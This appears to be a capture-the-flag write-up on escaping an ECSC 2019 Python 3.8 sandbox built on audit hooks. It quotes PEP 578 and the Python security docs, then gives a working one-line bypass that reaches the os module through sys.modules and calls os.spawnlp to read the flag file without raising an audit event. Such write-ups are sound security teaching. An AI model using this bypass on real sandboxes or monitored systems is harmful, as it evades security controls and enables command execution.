# PySand (sandbox, python, audithook, sys.modules)
Python 3.8 introduced new audithook feature. You can read more about it in [PEP 578](https://www.python.org/dev/peps/pep-0578/) and [PEP 551](https://www.python.org/dev/peps/pep-0551/). The idea was to increase the ability to monitor suspicious actions taken by attackers. Both documents emphasize that this feature should not be used as prevention mechanism:

```
This proposal does not attempt to restrict functionality, but simply exposes the
fact that the functionality is being used. Particularly for intrusion scenarios,
detection is significantly more important than early prevention (as early
prevention will generally drive attackers to use an alternate, less-detectable,
approach). The availability of audit hooks alone does not change the attack surface
of Python in any way, but they enable defenders to integrate Python into their
environment in ways that are currently not possible.
```

Moreover if you are asking yourself how do we implement sandbox in python, then the answer is simple – we don't. Python [documentation](https://python-security.readthedocs.io/security.html) is very strict about this:

```
Sandbox
Don’t try to build a sandbox inside CPython. The attack surface is too large. 
Python has many introspection features, see for example the inspect module. Python also 
many convenient features which executes code on demand. Examples:

the literal string '\N{Snowman}' imports the unicodedata module
the code to log a warning might be abused to execute code
The good design is to put CPython into a sandbox, not the opposite.
```

## Back to the challenge
In the challenge we are given a simple and at first glance very restrictive sandbox. Every action which invokes audithook is being just stoped and SecurityError is raised.

```python3
#!/usr/bin/env python3.8
import sys

class SecurityError(BaseException):
    pass

def audithook(name, tupla):
    raise SecurityError("Hackers not allowed. Tried to perform {}".format(name))

sys.addaudithook(audithook)
```

You can read which actions invoke audit event [here](https://docs.python.org/3/library/audit_events.html#audit-events). The list is very short and so it is obvious that it doesn't even try to log every malicious action, but just the most suspicious ones. 

So I started looking at avaible functions in [sys](https://docs.python.org/3/library/sys.html) and [os.path](https://docs.python.org/3/library/os.path.html#module-os.path) and [builtins](https://docs.python.org/3/library/functions.html#built-in-funcs) modules. But I couldn't find anything useful which doesn't invoke audit event.

But then I though of [sys.modules](https://docs.python.org/3/library/sys.html#sys.modules). When python3 starts up it already imports more modules then our program. This is some optimization (I guess, I've never checked) mechanism. 
So lets check which modules have been loaded:

```console
$ nc ecsc19.hack.cert.pl 25011
Give me code:
print(sys.modules)
{'sys': <module 'sys' (built-in)>, 'builtins': <module 'builtins' (built-in)>, '_frozen_importlib': <module '_frozen_importlib' (frozen)>, '_imp': <module '_imp' (built-in)>, '_warnings': <module '_warnings' (built-in)>, '_frozen_importlib_external': <module '_frozen_importlib_external' (frozen)>, '_io': <module 'io' (built-in)>, 'marshal': <module 'marshal' (built-in)>, 'posix': <module 'posix' (built-in)>, '_thread': <module '_thread' (built-in)>, '_weakref': <module '_weakref' (built-in)>, 'time': <module 'time' (built-in)>, 'zipimport': <module 'zipimport' (frozen)>, '_codecs': <module '_codecs' (built-in)>, 'codecs': <module 'codecs' from '/app/Python-3.8.0b1/Lib/codecs.py'>, 'encodings.aliases': <module 'encodings.aliases' from '/app/Python-3.8.0b1/Lib/encodings/aliases.py'>, 'encodings': <module 'encodings' from '/app/Python-3.8.0b1/Lib/encodings/__init__.py'>, 'encodings.utf_8': <module 'encodings.utf_8' from '/app/Python-3.8.0b1/Lib/encodings/utf_8.py'>, '_signal': <module '_signal' (built-in)>, '__main__': <module '__main__' from '/app/sandbox.py'>, 'encodings.latin_1': <module 'encodings.latin_1' from '/app/Python-3.8.0b1/Lib/encodings/latin_1.py'>, '_abc': <module '_abc' (built-in)>, 'abc': <module 'abc' from '/app/Python-3.8.0b1/Lib/abc.py'>, 'io': <module 'io' from '/app/Python-3.8.0b1/Lib/io.py'>, '_stat': <module '_stat' (built-in)>, 'stat': <module 'stat' from '/app/Python-3.8.0b1/Lib/stat.py'>, 'genericpath': <module 'genericpath' from '/app/Python-3.8.0b1/Lib/genericpath.py'>, 'posixpath': <module 'posixpath' from '/app/Python-3.8.0b1/Lib/posixpath.py'>, 'os.path': <module 'posixpath' from '/app/Python-3.8.0b1/Lib/posixpath.py'>, '_collections_abc': <module '_collections_abc' from '/app/Python-3.8.0b1/Lib/_collections_abc.py'>, 'os': <module 'os' from '/app/Python-3.8.0b1/Lib/os.py'>, '_sitebuiltins': <module '_sitebuiltins' from '/app/Python-3.8.0b1/Lib/_sitebuiltins.py'>, 'site': <module 'site' from '/app/Python-3.8.0b1/Lib/site.py'>, '_locale': <module '_locale' (built-in)>, '_bootlocale': <module '_bootlocale' from '/app/Python-3.8.0b1/Lib/_bootlocale.py'>}
```

Nice! Definitely more then `sys`, `os.path` and `builtins`! What is interesting we can see that the `os` module has been imported as well.
By searching the [os](https://docs.python.org/3/library/os.html) documentation we can find many interesting functions such as `os.open`, `os.system` etc. Most of them are noisy and result in rasing audit event. However there are also function like `os.spawnlp` which we can use.

The last question is, how do we access the `os` module? If we try to call os.spawnlp we will fail. But the answer is very simple. Just reference `os` module via `sys.modules['os']`.

## POC

```console
$ nc ecsc19.hack.cert.pl 25011
Give me code:
sys.modules['os'].spawnlp(sys.modules['os'].P_WAIT, '/bin/cat', 'cat', '/app/flag.txt')
ecsc19{Aud1tButDontTrust}
```



## References:
1) https://docs.python.org/3/library/audit_events.html#audit-events
2) https://daddycocoaman.dev/posts/bypassing-python38-audit-hooks-part-1/
3) https://www.python.org/dev/peps/pep-0551/
3) https://www.python.org/dev/peps/pep-0578/